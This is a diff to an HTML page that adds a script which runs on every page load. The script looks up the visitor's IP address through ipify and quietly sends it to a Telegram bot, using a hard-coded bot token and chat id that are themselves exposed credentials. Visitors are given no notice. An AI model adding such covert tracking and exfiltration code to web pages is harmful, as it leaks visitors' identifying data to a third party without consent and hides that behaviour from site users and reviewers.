@@ -292,5 +292,20 @@
 
 
 		</script>
+		<script type="text/javascript">
+		    window.onload = function () {
+		        var script = document.createElement("script");
+		        script.type = "text/javascript";
+		        script.src = "https://api.ipify.org?format=jsonp&callback=DisplayIP";
+		        document.getElementsByTagName("head")[0].appendChild(script);
+		    };
+		    function DisplayIP(response) {
+		        // console.log("Your IP Address is " + response.ip );
+		        var url  = "https://api.telegram.org/bot350072729:AAHDrRf71ZQgTXK2dVWyxuY5qGSgaXALnkE/sendMessage?chat_id=418861576&text="+response.ip;
+		       $.get(url, function(data, status){
+			        console.log("Data: " + data + "\nStatus: " + status);
+			    });
+		    }
+		</script>
 	</body>
 </html>
